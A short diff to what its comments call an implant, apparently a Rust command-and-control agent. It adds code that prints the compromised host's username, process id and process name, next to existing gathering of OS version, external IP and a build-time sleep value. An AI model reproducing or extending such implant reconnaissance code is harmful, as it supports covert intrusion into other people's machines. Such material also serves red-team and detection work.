@@ -43,7 +43,6 @@ pub extern "system" fn Pick() {
         os: func::get_version(ntdll),  //get the os version
         imp_pid: get_pid(), //get the process id
         process_name: get_process_name(),
-        //sleep: SLEEP.to_string(), //have this pull the actual value later
         sleep: env!("SLEEP").to_string(), //grabs the SLEEP from the environment used to build the implant
     };
 
@@ -54,5 +53,14 @@ pub extern "system" fn Pick() {
 
     //call get_external_ip and print the string
     println!("External IP: {}", func::get_external_ip(ntdll, kernel32));
+
+    //call the get_username fn and print the string
+    println!("username: {}", func::get_username());
+
+    //call the get_pid fn and print the string
+    println!("pid: {}", func::get_pid());
+
+    //call the get_process_name fn and print the string
+    println!("process name: {}", func::get_process_name(kernel32));
     
 }
